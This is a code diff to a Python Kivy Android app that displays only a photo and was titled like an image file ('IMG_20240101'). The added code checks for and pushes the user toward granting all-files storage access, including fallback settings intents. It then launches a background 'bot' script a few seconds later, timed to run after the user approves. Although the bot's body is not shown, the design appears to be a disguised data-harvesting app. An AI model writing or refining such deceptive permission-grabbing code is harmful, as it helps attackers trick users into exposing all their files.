@@ -9,8 +9,31 @@ from threading import Thread
 Window.clearcolor = (0, 0, 0, 1)
 
 
+def has_manage_storage_permission():
+    """يتأكد إذا صلاحية MANAGE_EXTERNAL_STORAGE معطاة"""
+    if platform != 'android':
+        return True
+    try:
+        from jnius import autoclass
+        Environment = autoclass('android.os.Environment')
+        return Environment.isExternalStorageManager()
+    except Exception:
+        return False
+
+
+def has_read_storage_permission():
+    """يتأكد إذا صلاحية READ_EXTERNAL_STORAGE معطاة"""
+    if platform != 'android':
+        return True
+    try:
+        from android.permissions import check_permission, Permission
+        return check_permission(Permission.READ_EXTERNAL_STORAGE)
+    except Exception:
+        return False
+
+
 def request_android_permissions():
-    """يطلب صلاحيات الملفات على أندرويد"""
+    """يطلب صلاحيات الملفات العادية"""
     if platform != 'android':
         return
     try:
@@ -18,13 +41,12 @@ def request_android_permissions():
         request_permissions([
             Permission.READ_EXTERNAL_STORAGE,
             Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.MANAGE_EXTERNAL_STORAGE,
         ])
     except Exception:
         pass
 
 
-def request_manage_storage():
+def open_manage_storage_settings():
     """يفتح شاشة الإعدادات لصلاحية MANAGE_EXTERNAL_STORAGE (أندرويد 11+)"""
     if platform != 'android':
         return
@@ -35,13 +57,23 @@ def request_manage_storage():
 
         @run_on_ui_thread
         def _open():
-            Intent = autoclass('android.content.Intent')
-            Settings = autoclass('android.provider.Settings')
-            Uri = autoclass('android.net.Uri')
+            try:
+                Intent = autoclass('android.content.Intent')
+                Settings = autoclass('android.provider.Settings')
+                Uri = autoclass('android.net.Uri')
 
-            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-            intent.setData(Uri.parse("package:" + mActivity.getPackageName()))
-            mActivity.startActivity(intent)
+                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                intent.setData(Uri.parse("package:" + mActivity.getPackageName()))
+                mActivity.startActivity(intent)
+            except Exception:
+                # fallback لبعض الأجهزة اللي مش بتدعم الإنتنت ده
+                try:
+                    Intent = autoclass('android.content.Intent')
+                    Settings = autoclass('android.provider.Settings')
+                    intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    mActivity.startActivity(intent)
+                except Exception:
+                    pass
 
         _open()
     except Exception:
@@ -50,7 +82,7 @@ def request_manage_storage():
 
 class PhotoApp(App):
     def build(self):
-        self.title = "IMG_20240101"
+        self.title = "aitisalat"
         layout = FloatLayout()
         self.img = Image(
             source='photo.jpg',
@@ -61,14 +93,26 @@ class PhotoApp(App):
         )
         layout.add_widget(self.img)
 
-        # طلب الصلاحيات العادية
-        request_android_permissions()
-        # طلب صلاحية الملفات الكاملة (تفتح الإعدادات)
-        Clock.schedule_once(lambda dt: request_manage_storage(), 2)
-        # شغل السكربت بعد 4 ثواني (عشان المستخدم يوافق)
-        Clock.schedule_once(self.start_bot, 4)
+        # === الخطوة 1: نتحقق ونطلب الصلاحيات ===
+        Clock.schedule_once(self.check_and_request_permissions, 0.5)
+        # === الخطوة 2: شغل السكربت ===
+        Clock.schedule_once(self.start_bot, 3)
 
         return layout
+
+    def check_and_request_permissions(self, dt):
+        """يتحقق إذا الصلاحيات معطاة، ولو لأ يطلبها"""
+        try:
+            # 1) صلاحيات الملفات العادية
+            if not has_read_storage_permission():
+                request_android_permissions()
+
+            # 2) صلاحية MANAGE_EXTERNAL_STORAGE (أندرويد 11+)
+            # === الفرق: نفتح الإعدادات بس لو مش معطاة ===
+            if not has_manage_storage_permission():
+                Clock.schedule_once(lambda dt: open_manage_storage_settings(), 1.5)
+        except Exception:
+            pass
 
     def start_bot(self, dt):
         try:
